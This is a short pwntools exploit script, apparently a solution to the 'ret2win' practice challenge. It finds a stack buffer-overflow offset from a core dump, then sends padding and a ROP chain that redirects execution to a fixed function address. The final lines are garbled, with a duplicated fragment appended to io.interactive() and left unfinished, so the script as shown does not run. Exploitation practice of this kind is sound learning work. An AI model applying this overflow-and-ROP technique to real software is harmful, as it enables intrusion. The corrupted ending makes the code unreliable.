#!/usr/bin/python
from pwn import *

# setup pwntools
elf = context.binary = ELF('ret2win')

# run process and inject random chars
io = process(elf.path)
io.sendline(cyclic(50))
io.wait()

# analyze corefile/dump
core = io.corefile
stack = core.rsp
info("%#x stack", stack)

# find the pattern where the crash happened
pattern = core.read(stack,4)
info("%r pattern", pattern)
pattern_offset = cyclic_find(pattern)
print "Pattern offset is: %i" % pattern_offset

rop = ROP(elf)
rop.raw(0x40081f) # address for ret2win - for some reason pwntools won't let me call the function
print (rop.dump())

payload = 'A'*pattern_offset + rop.chain()
payload += 'C'* (0x28 - len(payload))

# run it again
io = process(elf.path)
io.recv()
io.sendline(payload)
io.recv()
io.interactive()_offset + rop.chain()
payload += 'C'*